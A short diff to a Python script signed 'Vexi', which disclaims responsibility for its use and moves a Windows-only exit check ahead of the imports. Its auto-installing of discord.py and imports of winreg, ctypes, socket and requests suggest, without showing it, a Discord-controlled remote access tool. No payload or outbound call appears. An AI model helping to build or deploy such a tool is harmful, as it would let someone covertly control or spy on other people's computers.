@@ -2,6 +2,11 @@
 # I am not responsible for what you do with it or any consequences.  
 # Made by Vexi :3
 
+import platform
+
+if platform.system() != "Windows":
+    sys.exit(0)
+
 import os
 
 os.system("pip install discord.py")
@@ -27,7 +32,6 @@ import string
 import ctypes
 import threading
 import pyttsx3
-import platform
 import uuid
 import socket
 import re
@@ -35,9 +39,6 @@ import requests
 import winreg
 import base64
 import atexit
-
-if platform.system() != "Windows":
-    sys.exit(0)
 
 dir = os.path.dirname(os.path.abspath(__file__))
 lock = os.path.join(dir, ".lock")
